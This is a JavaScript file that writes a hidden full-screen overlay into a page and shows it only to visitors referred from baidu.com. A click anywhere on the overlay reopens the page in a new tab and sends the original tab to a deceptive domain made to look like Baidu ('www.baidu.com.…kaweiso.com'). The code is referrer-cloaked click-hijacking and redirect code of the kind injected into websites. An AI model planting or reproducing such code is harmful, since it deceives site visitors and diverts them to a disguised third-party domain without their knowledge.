document.write('<style type="text/css" media="screen">');
document.write('.new-user{display: none;position: fixed;z-index: 1000097;top: 50%;margin-top: -190px;left: 57%;margin-left: -300px}');
document.write('	.dialog-overlay{display: none;position: absolute;top: 0;left: 0;width: 100%;min-width: 990px;background: #000;opacity: .6;filter: Alpha(opacity=60);z-index: 1000096}');
document.write('</style>');
    
function AutoResizeImage(a, b, c) {
    var d = new Image();
    d.src = c.src;
    var e;
    var f;
    var g = 1;
    var w = d.width;
    var h = d.height;
    if (w > a) {
        f = a / w;
        e = b / h;
        if (a == 0 && b == 0) {
            g = 1;
        } else if (a == 0) {
            if (e < 1) g = e;
        } else if (b == 0) {
            if (f < 1) g = f;
        } else if (f < 1 || e < 1) {
            g = (f <= e ? f : e);
        }
        if (g < 1) {
            w = w * g;
            h = h * g;
        }
        c.height = h;
        c.width = w;
    }
}
    
function relocation() {
    window.open(window.location.href, '_blank');
    window.location.href = 'http://www.baidu.com.1253jh9856lk5124hg6352op5566hgyg.kaweiso.com/s/?wd=%e7%81%b5%e5%88%9b%e7%bd%91%e7%bb%9c&pcid=2d577d5f-4314-4cdb-ae6b-92e6a21ed01c';
}
document.write('<div id="overlay" style="visibility: hidden;">');
document.write('<div class="new-user" style="display: block;" onclick="relocation();">');
document.write('    <div class="new-pic">');
document.write('        <a name="index2_none_tk_xr">');
document.write('            <img src="http://www.iyoujia.cn/Certificate/20160908152141622.png" onload="AutoResizeImage(600,320,this)" height="400" width="350">');
document.write('        </a>');
document.write('    </div>');
document.write('</div>');
document.write('<div class="dialog-overlay" style="height: 1024px; display: block;">');
document.write('    <div class="overlay"></div>');
document.write('</div>');
document.write('</div>');
if (!window.opener && document.referrer.indexOf("baidu.com") != -1) {
        var a = document.getElementById("overlay");
        if (!window.opener && document.referrer.indexOf("baidu.com") != -1) {
            a.style.visibility = "visible";
        } else {
            a.style.visibility = "hidden";
        }
}
